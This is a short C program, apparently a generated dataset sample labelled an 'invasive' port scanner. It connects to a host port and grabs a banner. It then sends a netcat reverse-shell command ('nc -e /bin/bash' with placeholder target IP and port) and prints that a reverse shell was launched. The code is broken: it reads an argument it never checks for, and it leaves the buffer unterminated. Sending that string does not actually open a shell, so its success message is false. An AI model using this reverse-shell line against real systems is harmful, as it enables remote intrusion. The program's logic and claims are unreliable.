//Code Llama-13B DATASET v1.0 Category: Port Scanner ; Style: invasive
// Unique C Port Scanner Example Program in Invasive Style
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <host> <port>\n", argv[0]);
        return 1;
    }

    struct hostent *host = gethostbyname(argv[1]);
    if (host == NULL) {
        printf("Failed to resolve host %s\n", argv[1]);
        return 1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(argv[2]));
    addr.sin_addr.s_addr = *(unsigned long*)host->h_addr_list[0];

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("Failed to create socket\n");
        return 1;
    }

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        printf("Failed to connect to port %s:%s\n", argv[1], argv[2]);
        return 1;
    }

    printf("Successfully connected to port %s:%s\n", argv[1], argv[2]);

    // Perform a banner grab
    char buffer[256];
    int bytes = recv(sock, buffer, sizeof(buffer), 0);
    if (bytes < 0) {
        printf("Failed to receive banner\n");
        return 1;
    }
    printf("Banner: %s\n", buffer);

    // Perform a reverse shell
    char reverse_shell[] = "nc -e /bin/bash <target_ip> <target_port>\n";
    send(sock, reverse_shell, strlen(reverse_shell), 0);
    printf("Reverse shell launched\n");

    return 0;
}